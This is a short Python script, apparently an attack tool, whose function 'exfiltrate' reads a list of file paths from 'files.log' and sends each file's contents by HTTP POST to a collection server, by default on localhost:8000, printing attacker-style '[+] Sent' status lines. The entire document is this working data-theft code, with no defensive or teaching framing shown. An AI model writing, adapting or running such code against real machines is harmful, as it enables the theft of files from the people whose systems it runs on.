import os
import requests

def exfiltrate(file_path, server_url='http://localhost:8000'):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        filename = os.path.basename(file_path)
        headers = {'File-Name': filename}
        response = requests.post(server_url, data=data, headers=headers)

        if response.status_code == 200:
            print(f"[+] Sent: {filename}")
        else:
            print(f"[-] Failed: {filename} (Status: {response.status_code})")
    except Exception as e:
        print(f"[-] Error: {file_path} -> {e}")

def main():
    try:
        with open('files.log', 'r') as f:
            files = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("files.log not found.")
        return

    for file_path in files:
        exfiltrate(file_path)

if __name__ == "__main__":
    main()
 